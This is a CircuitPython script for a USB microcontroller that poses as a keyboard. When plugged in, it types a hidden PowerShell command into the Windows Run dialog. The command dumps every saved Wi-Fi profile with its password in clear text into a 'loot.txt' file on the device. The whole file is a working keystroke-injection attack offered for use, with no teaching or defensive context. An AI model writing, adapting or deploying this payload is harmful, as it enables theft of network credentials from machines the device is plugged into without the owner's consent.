import time, usb_hid, board, digitalio

from adafruit_hid.keyboard import Keyboard

from adafruit_hid.keycode import Keycode

from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS


kbd = Keyboard(usb_hid.devices)

layout = KeyboardLayoutUS(kbd)

led = digitalio.DigitalInOut(board.LED)

led.direction = digitalio.Direction.OUTPUT


cmd = "powershell -w h -c foreach($d in 68..74){$v=[char]$d+':';if(test-path $v/code.py){netsh wlan show prof name=* key=clear > $v/loot.txt}}" 

def attack():

    

    time.sleep(5)

    kbd.press(Keycode.GUI, Keycode.R)

    kbd.release_all()

    time.sleep(0.5)

    

   

    for char in cmd:

        layout.write(char)

       

        time.sleep(0.001) 

        

    kbd.send(Keycode.ENTER)


    led.value = True

    while True:

        pass 



attack() 
